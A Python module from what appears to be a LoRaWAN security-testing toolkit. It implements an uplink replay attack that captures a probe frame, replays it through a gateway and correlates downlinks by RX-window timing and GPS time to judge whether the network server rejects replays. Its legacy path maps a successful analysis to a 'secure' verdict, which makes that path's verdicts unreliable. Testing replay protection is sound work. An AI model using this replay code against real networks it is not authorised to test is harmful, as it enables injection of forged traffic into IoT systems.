"""Replay attack implementation - refactored to new API with typed config."""

from __future__ import annotations

import threading
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import TYPE_CHECKING, Any

from lora_attack_toolkit.attacks.base import BaseAttack
from lora_attack_toolkit.attacks.result import (
    AttackResult,
    Confidence,
    ExecutionStatus,
    SecurityVerdict,
)
from lora_attack_toolkit.attacks.analyzer import AttackAnalyzer
from lora_attack_toolkit.attacks.packet_capture import PacketCapture
from lora_attack_toolkit.attacks.validation import validate_criteria
from lora_attack_toolkit.lorawan.join import perform_otaa_join
from lora_attack_toolkit.lorawan.mac_commands import (
    CID_DEVICE_TIME_ANS,
    MACCommand,
    build_device_time_req,
    decode_device_time_ans,
    encode_mac_commands,
)
from lora_attack_toolkit.lorawan.time_utils import unix_to_gps
from lora_attack_toolkit.config import AttackTiming, RadioMetadata, UplinkReplayConfigV1

if TYPE_CHECKING:
    from lora_attack_toolkit.attacks.context import AttackContext
    from lora_attack_toolkit.config import ExpectedBehavior, ReplayConfigV1

# ── Timing record types ───────────────────────────────────────────────────────

@dataclass
class CapturedUplinkRecord:
    """Record of the captured probe uplink."""
    monotonic_time: float
    gps_time: float
    fcnt: int
    phy_payload: bytes


@dataclass
class ValidUplinkRecord:
    """Record of a clean verification uplink."""
    monotonic_time: float
    gps_time: float
    fcnt: int


@dataclass
class ReplayTxRecord:
    """Record of a single replay attempt."""
    monotonic_time: float
    gps_time: float
    replay_index: int


@dataclass
class DownlinkRxRecord:
    """Record of a received downlink with decoded MAC commands."""
    monotonic_time: float
    raw_payload: bytes
    decoded_mac_commands: list[Any] = field(default_factory=list)
    device_time_ans: Any = None  # DeviceTimeAnsData | None


# ── Verdict ───────────────────────────────────────────────────────────────────

class ReplayVerdict(str, Enum):
    PROTECTED = "protected"
    POSSIBLE_VULNERABILITY = "possible_vulnerability"
    VULNERABLE = "vulnerable"
    INCONCLUSIVE = "inconclusive"


# ── Timing window constants ───────────────────────────────────────────────────

_DEFAULT_TIMING = AttackTiming()
_RX_WINDOW_TOLERANCE_SEC = 0.5  # ± tolerance around expected RX1/RX2 window


# ── Correlation helpers ───────────────────────────────────────────────────────

def _in_rx_window(tx_mono: float, rx_mono: float) -> bool:
    """Return True if *rx_mono* falls inside the RX1 or RX2 window after *tx_mono*."""
    rx1_low = tx_mono + _DEFAULT_TIMING.rx1_delay_sec - _RX_WINDOW_TOLERANCE_SEC
    rx1_high = tx_mono + _DEFAULT_TIMING.rx1_delay_sec + _DEFAULT_TIMING.rx1_window_sec + _RX_WINDOW_TOLERANCE_SEC
    rx2_low = tx_mono + _DEFAULT_TIMING.rx2_delay_sec - _RX_WINDOW_TOLERANCE_SEC
    rx2_high = tx_mono + _DEFAULT_TIMING.rx2_delay_sec + _DEFAULT_TIMING.rx2_window_sec + _RX_WINDOW_TOLERANCE_SEC
    return (rx1_low <= rx_mono <= rx1_high) or (rx2_low <= rx_mono <= rx2_high)


def _gps_match(server_gps: float, tx_gps: float, tolerance: float) -> bool:
    """Return True if server GPS time matches a TX GPS time within tolerance."""
    return abs(server_gps - tx_gps) <= tolerance


def _determine_verdict(
    strong_matches: int,
    weak_matches: int,
    device_time_answers: int,
    expected_normal_answers: int,
    probe_received_device_time_ans: bool,
    downlinks_decodable: bool,
    gps_available: bool,
) -> ReplayVerdict:
    """Apply the verdict rules from the attack specification."""
    if not downlinks_decodable or not gps_available:
        return ReplayVerdict.INCONCLUSIVE

    if not probe_received_device_time_ans:
        return ReplayVerdict.INCONCLUSIVE

    if strong_matches >= 1:
        return ReplayVerdict.VULNERABLE

    if device_time_answers > expected_normal_answers:
        return ReplayVerdict.VULNERABLE

    if weak_matches >= 1:
        return ReplayVerdict.POSSIBLE_VULNERABILITY

    return ReplayVerdict.PROTECTED


def _replay_verdict_to_security(verdict: ReplayVerdict) -> tuple[SecurityVerdict, Confidence, bool | None]:
    """Map a ReplayVerdict to (SecurityVerdict, Confidence, target_protected)."""
    mapping: dict[ReplayVerdict, tuple[SecurityVerdict, Confidence, bool | None]] = {
        ReplayVerdict.PROTECTED:             (SecurityVerdict.SECURE,        Confidence.HIGH,   True),
        ReplayVerdict.POSSIBLE_VULNERABILITY:(SecurityVerdict.VULNERABLE,    Confidence.MEDIUM, False),
        ReplayVerdict.VULNERABLE:            (SecurityVerdict.VULNERABLE,    Confidence.HIGH,   False),
        ReplayVerdict.INCONCLUSIVE:          (SecurityVerdict.INCONCLUSIVE,  Confidence.LOW,    None),
    }
    return mapping[verdict]


# ── Channel selection helper ──────────────────────────────────────────────────

def _select_radio_for_uplink(ctx: "AttackContext", fcnt: int) -> RadioMetadata:
    """Delegate uplink channel selection to the device layer."""
    return ctx.device.select_uplink_radio(fcnt, ctx.radio)


# ── MAC response helper ───────────────────────────────────────────────────────

_FOPTS_MAX = 15  # LoRaWAN FOpts field maximum length in bytes


def _encode_pending_ans(pending: list[MACCommand]) -> bytes:
    """Encode accumulated MAC *Ans commands into FOpts bytes (max 15 bytes)."""
    return encode_mac_commands(pending)[:_FOPTS_MAX]


# ── Legacy analyzer (kept for backward compat with existing tests) ─────────────

class ReplayAnalyzer(AttackAnalyzer):
    """Analyzer for replay attack results."""

    def analyze(
        self, capture: PacketCapture, expected: ExpectedBehavior | None = None
    ) -> dict[str, Any]:
        """Analyze replay attack results."""
        stats = capture.get_stats()

        if stats["total_uplinks"] < 2:
            return {
                "success": False,
                "message": "Replay attack did not execute (insufficient uplinks captured)",
                "metrics": {"uplinks_captured": stats["total_uplinks"]},
            }

        original = None
        replays = []

        for i, packet in enumerate(capture.uplinks):
            if i == 0:
                original = packet
            elif original and packet.phy_payload == original.phy_payload:
                replays.append(packet)

        if not replays:
            return {
                "success": False,
                "message": "No replay packets detected",
                "metrics": {
                    "uplinks_captured": stats["total_uplinks"],
                    "original_fcnt": original.fcnt if original else None,
                },
            }

        metrics = {
            "original_fcnt": original.fcnt if original else None,
            "replays_count": len(replays),
            "replays_sent": len(replays),
            "total_uplinks": stats["total_uplinks"],
            "total_downlinks": stats["total_downlinks"],
        }

        result = {
            "success": True,
            "message": f"Replay attack executed: {len(replays)} replay(s) sent",
            "metrics": metrics,
        }

        if expected:
            validation = validate_criteria(
                attack_type="uplink_replay",
                criteria=expected.security_criteria,
                metrics=metrics,
                capture_stats=stats,
                secure_behavior=expected.secure_behavior,
            )
            result.update(validation.to_dict())
            result["validation_summary"] = validation.get_summary()

        return result


# ── Attack ────────────────────────────────────────────────────────────────────

class UplinkReplayAttack(BaseAttack):
    """
    Uplink replay attack — enhanced edition.

    Supports both the new flat :class:`UplinkReplayConfigV1` (recommended)
    and the legacy :class:`ReplayConfigV1` (backward compat).
    """

    name = "uplink_replay"

    def run(self, ctx: AttackContext) -> AttackResult:
        ctx.logger.info("uplink_replay_started")
        try:
            if isinstance(ctx.config, UplinkReplayConfigV1):
                return self._run_enhanced(ctx, ctx.config)
            return self._run_legacy(ctx)
        except Exception as e:
            ctx.logger.error(f"Attack failed: {e}", exc_info=True)
            return AttackResult.failed(
                attack_name=self.name,
                attack_type="uplink_replay",
                error=str(e),
            )

    # ── Enhanced path ─────────────────────────────────────────────────────────

    def _run_enhanced(self, ctx: AttackContext, cfg: UplinkReplayConfigV1) -> AttackResult:
        ctx.gateway.start()
        time.sleep(0.5)

        # 1. OTAA join
        t0 = time.monotonic()
        ctx.logger.info("Performing OTAA join... mono=%.3f", t0)
        if not perform_otaa_join(
            device=ctx.device,
            gateway=ctx.gateway,
            radio=ctx.radio,
            timeout_sec=5.0,
            logger=ctx.logger,
        ):
            ctx.gateway.stop()
            return AttackResult.failed(
                attack_name=self.name,
                attack_type="uplink_replay",
                error="OTAA join failed",
                message="OTAA join failed - cannot proceed with replay",
            )
        join_mono = time.monotonic()
        ctx.logger.info("OTAA join successful mono=%.3f", join_mono)

        # 2. Wait before first uplink
        ctx.logger.debug(
            "post_join_sleep interval_sec=%.3f mono=%.3f",
            cfg.uplink_interval_sec, join_mono,
        )
        time.sleep(cfg.uplink_interval_sec)

        # 3. Warm-up: send clean uplinks until FCntUp reaches capture_fcnt
        device_time_req_bytes = encode_mac_commands([build_device_time_req()])
        # Shared MAC *Ans queue: populated by _downlink_loop, consumed by uplink senders.
        pending_mac_ans: list[MACCommand] = []
        mac_ans_lock = threading.Lock()
        # How long to wait for RX1+RX2 after each pre-probe uplink.
        _pre_probe_rx_timeout = (
            _DEFAULT_TIMING.rx2_delay_sec + _DEFAULT_TIMING.rx2_window_sec + 0.5
        )

        while ctx.device.runtime.fcnt_up < cfg.capture_fcnt:
            current_fcnt = ctx.device.runtime.fcnt_up
            ctx.logger.debug(
                "waiting_for_capture_fcnt target=%d current=%d mono=%.3f",
                cfg.capture_fcnt, current_fcnt, time.monotonic(),
            )
            # Include any pending MAC *Ans from previous iteration.
            with mac_ans_lock:
                ans_snapshot = pending_mac_ans[:]
                pending_mac_ans.clear()
            f_opts = _encode_pending_ans(ans_snapshot) if ans_snapshot else b""
            frame = ctx.device.build_data_uplink(
                payload=bytes([current_fcnt % 256]),
                f_port=10,
                confirmed=False,
                f_opts=f_opts,
            )
            radio_meta = _select_radio_for_uplink(ctx, current_fcnt)
            tx_mono = time.monotonic()
            ctx.gateway.forward_uplink(frame, radio_meta)
            ctx.capture.capture_uplink(
                phy_payload=frame,
                fcnt=current_fcnt,
                packet_type="data_up",
            )
            ctx.logger.debug(
                "pre_probe_uplink_sent fcnt=%d freq_hz=%d mono=%.3f",
                current_fcnt, radio_meta.frequency, tx_mono,
            )
            # Drain RX1/RX2 window: process any incoming MAC commands so the NS
            # converges before the replay validation window opens.
            rx = ctx.gateway.await_downlink(timeout_sec=_pre_probe_rx_timeout)
            if rx is not None:
                try:
                    parsed = ctx.device.parse_downlink(rx)
                    mac_cmds = parsed.get("mac_commands", [])
                    if mac_cmds and isinstance(mac_cmds, list):
                        responses = ctx.device.apply_mac_commands(mac_cmds)
                        if responses and isinstance(responses, list):
                            with mac_ans_lock:
                                pending_mac_ans.extend(responses)
                            ctx.logger.info(
                                "pre_probe_mac_ans_queued count=%d fcnt=%d",
                                len(responses), current_fcnt,
                            )
                except Exception as exc:
                    ctx.logger.warning("pre_probe_downlink_parse_error: %s", exc)
            remaining_sleep = max(0.0, cfg.uplink_interval_sec - _pre_probe_rx_timeout)
            if remaining_sleep > 0:
                ctx.logger.debug(
                    "uplink_interval_sleep interval_sec=%.3f next_mono=%.3f",
                    remaining_sleep, time.monotonic() + remaining_sleep,
                )
                time.sleep(remaining_sleep)

        # 4. Probe uplink at FCntUp == capture_fcnt
        probe_fcnt = ctx.device.runtime.fcnt_up  # == capture_fcnt
        ctx.logger.debug(
            "waiting_for_capture_fcnt target=%d current=%d mono=%.3f",
            cfg.capture_fcnt, probe_fcnt, time.monotonic(),
        )
        # Combine DeviceTimeReq + any accumulated MAC *Ans (max 15 bytes FOpts).
        with mac_ans_lock:
            ans_snapshot = pending_mac_ans[:]
            pending_mac_ans.clear()
        probe_f_opts = (device_time_req_bytes + _encode_pending_ans(ans_snapshot))[:_FOPTS_MAX]
        frame = ctx.device.build_data_uplink(
            payload=bytes([probe_fcnt % 256]),
            f_port=10,
            confirmed=False,
            f_opts=probe_f_opts,
        )
        probe_radio = _select_radio_for_uplink(ctx, probe_fcnt)
        tx_mono = time.monotonic()
        tx_gps = unix_to_gps(time.time())
        ctx.gateway.forward_uplink(frame, probe_radio)
        fcnt_captured = ctx.device.runtime.fcnt_up - 1  # == capture_fcnt
        ctx.capture.capture_uplink(
            phy_payload=frame,
            fcnt=fcnt_captured,
            packet_type="data_up",
        )
        captured = CapturedUplinkRecord(
            monotonic_time=tx_mono,
            gps_time=tx_gps,
            fcnt=fcnt_captured,
            phy_payload=frame,
        )
        ctx.logger.info(
            "probe_uplink_sent fcnt=%d contains_device_time_req=true freq_hz=%d mono=%.3f",
            fcnt_captured, probe_radio.frequency, tx_mono,
        )
        ctx.logger.info("probe_uplink_captured fcnt=%d mono=%.3f", fcnt_captured, tx_mono)

        # 5–8. Parallel replay loop + normal uplink loop + downlink listener
        gateway_lock = threading.Lock()
        valid_tx: list[ValidUplinkRecord] = []
        replay_tx: list[ReplayTxRecord] = []
        downlink_rx: list[DownlinkRxRecord] = []
        downlink_lock = threading.Lock()
        stop_dl_event = threading.Event()

        def _replay_loop() -> None:
            for i in range(cfg.replay_count):
                next_mono = time.monotonic() + cfg.replay_attempt_interval_sec
                ctx.logger.debug(
                    "replay_interval_sleep interval_sec=%.3f next_mono=%.3f",
                    cfg.replay_attempt_interval_sec, next_mono,
                )
                time.sleep(cfg.replay_attempt_interval_sec)
                replay_radio = _select_radio_for_uplink(ctx, captured.fcnt + i)
                with gateway_lock:
                    tx_mono = time.monotonic()
                    tx_gps = unix_to_gps(time.time())
                    ctx.gateway.forward_uplink(captured.phy_payload, replay_radio)
                replay_tx.append(ReplayTxRecord(
                    monotonic_time=tx_mono,
                    gps_time=tx_gps,
                    replay_index=i,
                ))
                ctx.logger.info(
                    "replay_sent index=%d fcnt=%d freq_hz=%d mono=%.3f",
                    i, captured.fcnt, replay_radio.frequency, tx_mono,
                )

        def _normal_uplink_loop() -> None:
            for i in range(cfg.verification_uplink_count):
                sleep_start = time.monotonic()
                ctx.logger.debug(
                    "uplink_interval_sleep interval_sec=%.3f mono=%.3f",
                    cfg.uplink_interval_sec, sleep_start,
                )
                time.sleep(cfg.uplink_interval_sec)
                # Drain accumulated MAC *Ans from _downlink_loop.
                with mac_ans_lock:
                    ans_snapshot = pending_mac_ans[:]
                    pending_mac_ans.clear()
                f_opts = _encode_pending_ans(ans_snapshot) if ans_snapshot else b""
                frame = ctx.device.build_data_uplink(
                    payload=bytes([i % 256]),
                    f_port=10,
                    confirmed=False,
                    f_opts=f_opts,
                )
                fcnt_before_build = ctx.device.runtime.fcnt_up - 1
                normal_radio = _select_radio_for_uplink(ctx, fcnt_before_build)
                with gateway_lock:
                    tx_mono = time.monotonic()
                    tx_gps = unix_to_gps(time.time())
                    ctx.gateway.forward_uplink(frame, normal_radio)
                fcnt = ctx.device.runtime.fcnt_up - 1
                valid_tx.append(ValidUplinkRecord(
                    monotonic_time=tx_mono,
                    gps_time=tx_gps,
                    fcnt=fcnt,
                ))
                ctx.capture.capture_uplink(
                    phy_payload=frame,
                    fcnt=fcnt,
                    packet_type="data_up",
                )
                ctx.logger.info(
                    "verification_uplink_sent index=%d fcnt=%d freq_hz=%d mono=%.3f",
                    i, fcnt, normal_radio.frequency, tx_mono,
                )

        def _downlink_loop() -> None:
            while not stop_dl_event.is_set():
                raw = ctx.gateway.await_downlink(timeout_sec=0.3)
                if raw is None:
                    continue
                mono = time.monotonic()
                ctx.logger.info("downlink_received mono=%.3f", mono)
                mac_cmds: list[Any] = []
                dt_ans = None
                try:
                    parsed = ctx.device.parse_downlink(raw)
                    mac_cmds = parsed.get("mac_commands", [])
                    for cmd in mac_cmds:
                        if cmd.cid == CID_DEVICE_TIME_ANS:
                            dt_ans = decode_device_time_ans(cmd)
                            if dt_ans is not None:
                                ctx.logger.info(
                                    "device_time_ans_decoded gps_seconds=%d"
                                    " fractional=%d mono=%.3f",
                                    dt_ans.gps_seconds,
                                    dt_ans.fractional,
                                    mono,
                                )
                    # Generate *Ans for every MAC command the NS sent.
                    if mac_cmds and isinstance(mac_cmds, list):
                        responses = ctx.device.apply_mac_commands(mac_cmds)
                        if responses and isinstance(responses, list):
                            with mac_ans_lock:
                                pending_mac_ans.extend(responses)
                            ctx.logger.info(
                                "mac_cmd_ans_queued count=%d mono=%.3f",
                                len(responses), mono,
                            )
                except Exception as exc:
                    ctx.logger.warning("downlink_parse_error: %s", exc)
                with downlink_lock:
                    downlink_rx.append(DownlinkRxRecord(
                        monotonic_time=mono,
                        raw_payload=raw,
                        decoded_mac_commands=mac_cmds,
                        device_time_ans=dt_ans,
                    ))
                ctx.capture.capture_downlink(
                    phy_payload=raw,
                    packet_type="data_down",
                )

        t_replay = threading.Thread(target=_replay_loop, daemon=True)
        t_normal = threading.Thread(target=_normal_uplink_loop, daemon=True)
        t_dl = threading.Thread(target=_downlink_loop, daemon=True)

        ctx.logger.info(
            "replay_started_after_fcnt=%d mono=%.3f", cfg.capture_fcnt, time.monotonic()
        )
        ctx.logger.info(
            "verification_window_started_after_fcnt=%d mono=%.3f",
            cfg.capture_fcnt, time.monotonic(),
        )
        t_dl.start()
        t_replay.start()
        t_normal.start()

        t_replay.join()
        t_normal.join()
        # Give RX windows time to drain after last TX
        time.sleep(max(_DEFAULT_TIMING.rx2_delay_sec + _DEFAULT_TIMING.rx2_window_sec, 3.0))
        stop_dl_event.set()
        t_dl.join(timeout=2.0)

        ctx.gateway.stop()

        # 9–11. Analyse
        return self._analyze_enhanced(
            cfg=cfg,
            ctx=ctx,
            captured=captured,
            valid_tx=valid_tx,
            replay_tx=replay_tx,
            downlink_rx=downlink_rx,
        )

    def _analyze_enhanced(
        self,
        cfg: UplinkReplayConfigV1,
        ctx: AttackContext,
        captured: CapturedUplinkRecord,
        valid_tx: list[ValidUplinkRecord],
        replay_tx: list[ReplayTxRecord],
        downlink_rx: list[DownlinkRxRecord],
    ) -> AttackResult:
        tol = cfg.device_time_gps_tolerance_sec

        strong_replay_matches = 0
        weak_replay_matches = 0
        device_time_answers = 0
        downlinks_decodable = True
        probe_received_dt_ans = False

        # Check probe's own RX window for DeviceTimeAns
        probe_rx_deadline = captured.monotonic_time + _DEFAULT_TIMING.rx2_delay_sec + _DEFAULT_TIMING.rx2_window_sec + _RX_WINDOW_TOLERANCE_SEC
        for dl in downlink_rx:
            if dl.device_time_ans is not None and dl.monotonic_time <= probe_rx_deadline:
                probe_received_dt_ans = True
                break

        for dl in downlink_rx:
            if dl.device_time_ans is not None:
                device_time_answers += 1

            # Try to decode; flag if a downlink payload is non-empty but unparseable
            if dl.raw_payload and not dl.decoded_mac_commands and dl.device_time_ans is None:
                # Non-empty but nothing decoded — mark as non-decodable for this record
                # (we still continue; overall decodable flag stays True unless zero parsed)
                pass

            rx_replay_match = False
            gps_replay_match = False

            # RX-window timing check against replay TX events
            for rtx in replay_tx:
                if _in_rx_window(rtx.monotonic_time, dl.monotonic_time):
                    rx_replay_match = True
                    break

            # GPS-time check against replay TX events
            if dl.device_time_ans is not None:
                server_gps = float(dl.device_time_ans.gps_seconds) + dl.device_time_ans.fractional / 256.0
                for rtx in replay_tx:
                    if _gps_match(server_gps, rtx.gps_time, tol):
                        # Ensure no normal uplink also matches within tolerance
                        normal_also_matches = any(
                            _gps_match(server_gps, vtx.gps_time, tol)
                            for vtx in valid_tx
                        ) or _gps_match(server_gps, captured.gps_time, tol)
                        if not normal_also_matches:
                            gps_replay_match = True
                            break

            if rx_replay_match and gps_replay_match:
                strong_replay_matches += 1
            elif rx_replay_match or gps_replay_match:
                weak_replay_matches += 1

        # Expected DeviceTimeAns count = 1 (probe) + verification_uplinks that get a response
        # Conservative: assume only the probe triggers one
        expected_normal_answers = 1

        verdict = _determine_verdict(
            strong_matches=strong_replay_matches,
            weak_matches=weak_replay_matches,
            device_time_answers=device_time_answers,
            expected_normal_answers=expected_normal_answers,
            probe_received_device_time_ans=probe_received_dt_ans,
            downlinks_decodable=downlinks_decodable,
            gps_available=True,
        )

        ctx.logger.info(
            "ignored_pre_probe_downlink count=0"
        )
        ctx.logger.info(
            "replay_validation strong=%d weak=%d dt_ans=%d verdict=%s mono=%.3f",
            strong_replay_matches,
            weak_replay_matches,
            device_time_answers,
            verdict.value,
            time.monotonic(),
        )

        metrics: dict[str, Any] = {
            "captured_fcnt": captured.fcnt,
            "replay_count": cfg.replay_count,
            "verification_uplink_count": cfg.verification_uplink_count,
            "total_downlinks": len(downlink_rx),
            "device_time_answers": device_time_answers,
            "rx_timing_replay_matches": sum(
                1 for dl in downlink_rx
                if any(_in_rx_window(r.monotonic_time, dl.monotonic_time) for r in replay_tx)
            ),
            "gps_time_replay_matches": sum(
                1 for dl in downlink_rx
                if dl.device_time_ans is not None
                and any(
                    _gps_match(
                        float(dl.device_time_ans.gps_seconds) + dl.device_time_ans.fractional / 256.0,
                        r.gps_time, tol
                    )
                    for r in replay_tx
                )
            ),
            "strong_replay_matches": strong_replay_matches,
            "weak_replay_matches": weak_replay_matches,
            "verdict": verdict.value,
        }

        sv, conf, protected = _replay_verdict_to_security(verdict)
        return AttackResult(
            attack_name=self.name,
            attack_type="uplink_replay",
            execution_status=ExecutionStatus.COMPLETED,
            security_verdict=sv,
            confidence=conf,
            target_protected=protected,
            message=f"Replay attack complete: verdict={verdict.value}",
            metrics=metrics,
            captured_packets=len(ctx.capture.uplinks) + len(ctx.capture.downlinks),
        )

    def _run_legacy(self, ctx: AttackContext) -> AttackResult:
        config = ctx.config  # ReplayConfigV1
        replay_count = config.replay_phase.count
        replay_delay = config.replay_phase.delay_sec
        perform_join = config.capture_phase.perform_join
        payload_hex = config.capture_phase.payload_hex or "CAFEBABE"

        ctx.logger.info("Starting gateway...")
        ctx.gateway.start()
        time.sleep(0.5)

        if perform_join:
            ctx.logger.info("Performing OTAA join...")
            join_success = perform_otaa_join(
                device=ctx.device,
                gateway=ctx.gateway,
                radio=ctx.radio,
                timeout_sec=5.0,
                logger=ctx.logger,
            )
            if not join_success:
                return AttackResult.failed(
                    attack_name=self.name,
                    attack_type="uplink_replay",
                    error="OTAA join failed",
                    message="OTAA join failed - cannot proceed with replay",
                )
            ctx.logger.info("OTAA join successful")

        ctx.logger.info("Sending original uplink...")
        payload = bytes.fromhex(payload_hex)
        original_uplink = ctx.device.build_data_uplink(
            payload=payload, f_port=10, confirmed=False
        )
        tx_mono = time.monotonic()
        ctx.gateway.forward_uplink(original_uplink, ctx.radio)
        fcnt_original = ctx.device.runtime.fcnt_up - 1
        ctx.capture.capture_uplink(
            phy_payload=original_uplink,
            fcnt=fcnt_original,
            packet_type="data_up",
        )
        ctx.logger.info(
            "original_uplink_sent fcnt=%d mono=%.3f", fcnt_original, tx_mono
        )

        delay_start = time.monotonic()
        ctx.logger.info(
            "replay_delay_start delay_sec=%.3f mono=%.3f", replay_delay, delay_start
        )
        time.sleep(replay_delay)
        delay_elapsed_ms = (time.monotonic() - delay_start) * 1000
        ctx.logger.info(
            "replay_delay_done elapsed_ms=%.0f mono=%.3f",
            delay_elapsed_ms, time.monotonic(),
        )

        ctx.logger.info(f"Replaying uplink {replay_count} time(s)...")
        for i in range(replay_count):
            t_replay = time.monotonic()
            ctx.gateway.forward_uplink(original_uplink, ctx.radio)
            ctx.capture.capture_uplink(
                phy_payload=original_uplink,
                fcnt=ctx.device.runtime.fcnt_up - 1,
                packet_type="data_up",
            )
            ctx.logger.info(
                "replay_sent attempt=%d/%d mono=%.3f", i + 1, replay_count, t_replay
            )
            if i < replay_count - 1:
                time.sleep(0.1)

        ctx.logger.info(f"Replay attack complete: {replay_count} replay(s) sent")
        ctx.gateway.stop()

        ctx.logger.info("Analyzing results...")
        analyzer = ReplayAnalyzer()
        analysis = analyzer.analyze(ctx.capture, ctx.expected)

        # Map legacy analysis success flag to standardized verdict
        legacy_success = analysis.get("success", True)
        sv = SecurityVerdict.SECURE if legacy_success else SecurityVerdict.INCONCLUSIVE
        return AttackResult(
            attack_name=self.name,
            attack_type="uplink_replay",
            execution_status=ExecutionStatus.COMPLETED,
            security_verdict=sv,
            confidence=Confidence.LOW,
            message=analysis["message"],
            metrics=analysis["metrics"],
            captured_packets=len(ctx.capture.uplinks) + len(ctx.capture.downlinks),
            validation_summary=analysis.get("validation_summary"),
            criteria_met=analysis.get("criteria_met"),
        )


# Backwards-compatible alias for older tests and examples.
ReplayAttack = UplinkReplayAttack
